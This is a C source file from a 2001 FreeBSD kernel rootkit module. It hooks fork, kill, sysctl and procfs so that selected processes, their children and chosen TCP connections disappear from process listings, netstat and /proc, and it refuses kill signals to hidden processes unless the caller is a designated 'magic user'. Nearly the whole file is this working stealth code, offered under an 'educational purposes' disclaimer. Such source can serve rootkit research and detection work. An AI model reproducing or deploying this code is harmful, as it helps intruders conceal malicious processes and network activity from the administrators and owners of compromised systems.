/*
 * Copyright (c) 2001, Stephanie Wehner <atrak@itsx.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The names of its contributors may be used to endorse or promote products
 *    derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDER AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 *    Large parts of the procfs code are taken from the FreeBSD source tree.
 *
 *    $Id: process.c,v 1.1.1.1 2001/08/06 12:02:06 atrak Exp $
 *
 *    This file contains a collection of process related hacks, namely:
 *        - replacement fork to hide kids of hidden processes
 *        - replacement kill to prevent 'unauthorized' killing of hidden stuff
 *        - sysctl replacement to filter out processess and network conns
 *        - procfs fix to hide processes
 *
 *    This stuff was written for educational purposes only. Keep in mind that
 *    it is still possible to get to know about these processes via /dev/kmem 
 *    if someone wants to.
 */

#include <sys/types.h>
#include <sys/systm.h>
#include <sys/param.h>
#include <sys/errno.h>
#include <sys/sysctl.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/kernel.h>
#include <sys/lock.h>
#include <sys/fcntl.h>
#include <sys/ucred.h>
#include <sys/proc.h>
#include <sys/signalvar.h>
#include <sys/uio.h>
#include <sys/mount.h>
#include <sys/namei.h>
#include <sys/dirent.h>
#include <sys/malloc.h>
#include <sys/unistd.h>
#include <sys/sysproto.h>

#include <vm/vm.h>
#include <sys/lock.h>
#include <vm/pmap.h>
#include <vm/vm_map.h>
#include <vm/vm_extern.h>
#include <machine/reg.h>
#include <vm/vm_zone.h>
#include <sys/select.h>
#include "vnode.h"

#include <sys/user.h>
#include <sys/dirent.h>

#include <net/route.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <sys/socketvar.h>
#include <netinet/in_pcb.h>
#include <netinet/tcp.h>
#include <netinet/tcp_var.h>

#include <miscfs/procfs/procfs.h>
#include <sys/dirent.h>

#include "../config.h"
#include "util.h"
#include "vnode.h" 
#include "control.h"

#define C(x)    ((u_int)((x) & 0xff))

#ifdef PROCESS_HACKS

MALLOC_DEFINE(M_NEW_SYSCTL,"p_data","struct");

extern vop_t *old_procfs_lookup;
extern pid_t atopid __P((const char *, u_int));

int new_sysctl(struct proc *, struct sysctl_args *);
int new_fork(struct proc *, struct fork_args *);
int new_kill(struct proc *, struct kill_args *);

int new_procfs_readdir(struct vop_readdir_args *);
int new_procfs_lookup(struct vop_lookup_args *);

/*
 * This is a list of the valid names in the
 * process-specific sub-directories.  It is
 * used in procfs_lookup and procfs_readdir
 */
static struct proc_target {
        u_char  pt_type;
        u_char  pt_namlen;
        char    *pt_name;
        pfstype pt_pfstype;
        int     (*pt_valid) __P((struct proc *p));
} proc_targets[] = {
#define N(s) sizeof(s)-1, s
        /*        name          type            validp */
        { DT_DIR, N("."),       Pproc,          NULL },
        { DT_DIR, N(".."),      Proot,          NULL },
        { DT_REG, N("mem"),     Pmem,           NULL },
        { DT_REG, N("regs"),    Pregs,          procfs_validregs },
        { DT_REG, N("fpregs"),  Pfpregs,        procfs_validfpregs },
        { DT_REG, N("dbregs"),  Pdbregs,        procfs_validdbregs },
        { DT_REG, N("ctl"),     Pctl,           NULL },
        { DT_REG, N("status"),  Pstatus,        NULL },
        { DT_REG, N("note"),    Pnote,          NULL },
        { DT_REG, N("notepg"),  Pnotepg,        NULL },
        { DT_REG, N("map"),     Pmap,           procfs_validmap },
        { DT_REG, N("etype"),   Ptype,          procfs_validtype },
        { DT_REG, N("cmdline"), Pcmdline,       NULL },
        { DT_REG, N("rlimit"),  Prlimit,        NULL },
        { DT_LNK, N("file"),    Pfile,          NULL },
#undef N
};

extern int nproc_targets;

/*
 * fork replacement, children of hidden processes are also hidden 
 */

int
new_fork(struct proc *p, register struct fork_args *uap)
{
    int error;
    struct proc *p2;

    /* do the normal fork stuff */
    error = fork1(p, RFFDG | RFPROC, &p2);
    if (error == 0) {
        p->p_retval[0] = p2->p_pid;
        p->p_retval[1] = 0;
    }


    /* if the parent pid was hidden, hide as well */
    if(pid_hidden(p->p_pid)) 
        p2->p_flag |= P_HIDDEN;

    return(error);
}

/*
 * kill replacement, don't kill hidden process unless the user
 * is the magic user
 */

int 
new_kill(struct proc *p, struct kill_args *uap)
{
    /* check if process is hidden */
    if(pid_hidden(uap->pid) && (!is_magic_user(p->p_cred->pc_ucred->cr_uid)))
        return(ESRCH);
	
    return(kill(p,uap));
}

#endif /* PROCESS_HACKS */

#if defined (PROCESS_HACKS) ||  defined (NETSTAT_HACK)

/*
 * new_sysctl - replacement for __sysctl to hide a process or a network connection
 */
 
int
new_sysctl(struct proc *p, struct sysctl_args *uap)
{
    int error, i, name[CTL_MAXNAME];
    size_t size, newsize, recsize;
    struct kinfo_proc *p_data, *ptr;
    struct xinpgen *n_data, *n_ptr;
    struct inpcb *inp = NULL;
    struct xsocket *so;

    if (uap->namelen > CTL_MAXNAME || uap->namelen < 2)
        return (EINVAL);

    error = copyin(uap->name, &name, uap->namelen * sizeof(int));
    if (error)
        return (error);

    /* 
        There are basically two cases: information about
	a single pid can be requested or about all pids.
	If information about a single pid is requested we can
	fix this right away.
    */

    if(((name[2] == KERN_PROC_PID) || (name[2] == KERN_PROC_ARGS)) 
        && (pid_hidden(name[3])) &&  (!is_magic_user(p->p_cred->pc_ucred->cr_uid))) {

        /* return size 0 for no such proces */
	size = 0;
	copyout(&size,uap->oldlenp, sizeof(size));

	return(0);
    }

    error = userland_sysctl(p, name, uap->namelen,
                uap->old, uap->oldlenp, 0,
                uap->new, uap->newlen, &size);
    if (error && error != ENOMEM)
        return (error);

    if(!uap->oldlenp)
        return(error);

    newsize = size;

    /* check what kind of information has been requested */

    if ((uap->old) && (name[0] == CTL_KERN) && (name[1] == KERN_PROC)) {

        /* user wants process information */

	/* allocate memory */
	MALLOC(p_data, struct kinfo_proc *, size, M_NEW_SYSCTL, M_NOWAIT); 

	/* check the memory region in user space for a kinfo_proc 
		    structure with a hidden pid */

	recsize = sizeof(struct kinfo_proc);

	copyin(uap->old,p_data,size); 
	ptr = p_data;

	for(i = size;i > 0;i = i - recsize) { 

	    /* is the current pid hidden ? */
	    if(pid_hidden(ptr->kp_proc.p_pid) && 
	        (!is_magic_user(p->p_cred->pc_ucred->cr_uid))) {

	        mod_debug("hiding process %d\n",ptr->kp_proc.p_pid);
		/* decrease size by one record */
		newsize -= sizeof(struct kinfo_proc);

		/* if there's a following record, cut it out */
		if((i - recsize) >  0) 
		    bcopy((char *)ptr + recsize, ptr, (i - recsize)); 
	    }  

            /* advance to the next entry */
            if((i - recsize) >  0) 
	        ptr = (struct kinfo_proc *)((char *)ptr + recsize);
        } 

	/* copy out the new data */
	copyout(p_data, uap->old, newsize); 

	/* free the kernel memory */
	FREE(p_data, M_NEW_SYSCTL); 

    } else if((uap->old) && (name[0] == CTL_NET) && (name[1] == PF_INET) &&
			(name[2] == IPPROTO_TCP) && (name[3] == TCPCTL_PCBLIST)) {

	/* user wants network information */

        /* allocate memory */
        MALLOC(n_data, struct xinpgen *, size, M_NEW_SYSCTL, M_NOWAIT);

        /* check the memory for the given source ip/dest ip/dest port */
	copyin(uap->old,n_data,size);
	n_ptr = n_data;
	recsize = sizeof(struct xtcpcb);

	if(sizeof(struct xinpgen) < size)
	    n_ptr = (struct xinpgen *)((char *)n_ptr + sizeof(struct xinpgen));

	for(i = size;i > 0;i = i - recsize) {

	    inp = &((struct xtcpcb *)n_ptr)->xt_inp;
            so = &((struct xtcpcb *)n_ptr)->xt_socket;

	    if(net_hidden(inp->inp_laddr.s_addr, inp->inp_lport, inp->inp_faddr.s_addr, inp->inp_fport) &&
	        (!is_magic_user(p->p_cred->pc_ucred->cr_uid))) {

	        mod_debug("Hiding network connection\n");
		newsize -= recsize;
				
		if((i - recsize) > 0) 
		    bcopy((char *)n_ptr + recsize, n_ptr, (i - recsize));
            }

            if((i - recsize) > 0)
	        n_ptr = (struct xinpgen *)((char *)n_ptr + recsize);

	}

	/* copy out the new data */
	copyout(n_data, uap->old, newsize);

	/* free kernel memory */
	FREE(n_data, M_NEW_SYSCTL);

    } 

    /* set the new size */
    i = copyout(&newsize, uap->oldlenp, sizeof(newsize));
    if(i)
        return(i);

    return(error);
}

#endif /* PROCESS_HACKS || NETSTAT_HACK */

#ifdef PROCESS_HACKS

/* 
 * also hide process from procfs by patching procfs readdir
 *
 * this could have been done by hiding the process pid from getdirentries
 * but it's a bit too much imho to hide all files with a certain number 
 * system wide. people might actually use files with these names.
 *
 * this code is an adapted version of procfs_readdir from freebsd 4.2
 */

int
new_procfs_readdir(struct vop_readdir_args *ap)
{
        struct uio *uio = ap->a_uio;
        struct dirent d;
        struct dirent *dp = &d;
        struct pfsnode *pfs;
        int count, error, i, off;
        static u_int delen;

        if (!delen) {

                d.d_namlen = PROCFS_NAMELEN;
                delen = GENERIC_DIRSIZ(&d);
        }

        pfs = VTOPFS(ap->a_vp);

        off = (int)uio->uio_offset;
        if (off != uio->uio_offset || off < 0 || 
            off % delen != 0 || uio->uio_resid < delen)
                return (EINVAL);

        error = 0;
        count = 0;
        i = off / delen;

        switch (pfs->pfs_type) {
        /*
         * this is for the process-specific sub-directories.
         * all that is needed to is copy out all the entries
         * from the procent[] table (top of this file).
         */
        case Pproc: {
                struct proc *p;
                struct proc_target *pt;

                p = PFIND(pfs->pfs_pid);
                if (p == NULL)
                        break;
                if (!PRISON_CHECK(curproc, p))
                        break;

		/* check if this process should be hidden */
		if(pid_hidden(pfs->pfs_pid) && (!is_magic_user(ap->a_cred->cr_uid))) {
			error = ENOTDIR;
			break;
		}

                for (pt = &proc_targets[i];
                     uio->uio_resid >= delen && i < nproc_targets; pt++, i++) {
                        if (pt->pt_valid && (*pt->pt_valid)(p) == 0)
                                continue;

                        dp->d_reclen = delen;
                        dp->d_fileno = PROCFS_FILENO(pfs->pfs_pid, pt->pt_pfstype);
                        dp->d_namlen = pt->pt_namlen;
                        bcopy(pt->pt_name, dp->d_name, pt->pt_namlen + 1);
                        dp->d_type = pt->pt_type;

                        if ((error = uiomove((caddr_t)dp, delen, uio)) != 0)
                                break;
                }

                break;
            }

        /*
         * this is for the root of the procfs filesystem
         * what is needed is a special entry for "curproc"
         * followed by an entry for each process on allproc
#ifdef PROCFS_ZOMBIE
         * and zombproc.
#endif
         */

        case Proot: {
#ifdef PROCFS_ZOMBIE
                int doingzomb = 0;
#endif
                int pcnt = 0;
                volatile struct proc *p = allproc.lh_first;

                for (; p && uio->uio_resid >= delen; i++, pcnt++) {
                        bzero((char *) dp, delen);
                        dp->d_reclen = delen;

                        switch (i) {
                        case 0:         /* `.' */
                        case 1:         /* `..' */
                                dp->d_fileno = PROCFS_FILENO(0, Proot);
                                dp->d_namlen = i + 1;
                                bcopy("..", dp->d_name, dp->d_namlen);
                                dp->d_name[i + 1] = '\0';
                                dp->d_type = DT_DIR;
                                break;

                        case 2:
                                dp->d_fileno = PROCFS_FILENO(0, Pcurproc);
                                dp->d_namlen = 7;
                                bcopy("curproc", dp->d_name, 8);
                                dp->d_type = DT_LNK;
                                break;

                        default:
                                while (pcnt < i) {
                                        p = p->p_list.le_next;
                                        if (!p)
                                                goto done;
                                        if (!PRISON_CHECK(curproc, p))
                                                continue;
                                        pcnt++;
                                }
                                while (!PRISON_CHECK(curproc, p)) {
                                        p = p->p_list.le_next;
                                        if (!p)
                                                goto done;
                                }
				
				/* hide process */
				while(pid_hidden(p->p_pid) && 
					(!is_magic_user(ap->a_cred->cr_uid))) {
					p = p->p_list.le_next;
					if (!p)
						goto done;
				}

                                dp->d_fileno = PROCFS_FILENO(p->p_pid, Pproc);
                                dp->d_namlen = sprintf(dp->d_name, "%ld",
                                    (long)p->p_pid);
                                dp->d_type = DT_DIR;
                                p = p->p_list.le_next;
                                break;
                        }

                        if ((error = uiomove((caddr_t)dp, delen, uio)) != 0)
                                break;
                }
        done:

#ifdef PROCFS_ZOMBIE
                if (p == 0 && doingzomb == 0) {
                        doingzomb = 1;
                        p = zombproc.lh_first;
                        goto again;
                }
#endif

                break;

            }

        default:
                error = ENOTDIR;
                break;
        }

        uio->uio_offset = i * delen;

        return (error);
}

/*
 * replacement for procfs_lookup, this will be used in the case someone doesn't just
 * do a ls in /proc but tries to enter a dir with a certain pid
 */

int
new_procfs_lookup(struct vop_lookup_args *ap)
{
    struct componentname *cnp = ap->a_cnp;
    char *pname = cnp->cn_nameptr;
    pid_t pid;

    pid = atopid(pname, cnp->cn_namelen);

    if(pid_hidden(pid) && !(is_magic_user((cnp->cn_cred)->cr_uid))) 
        return(ENOENT);

    return(old_procfs_lookup(ap));
}

#endif /* PROCESS_HACKS */

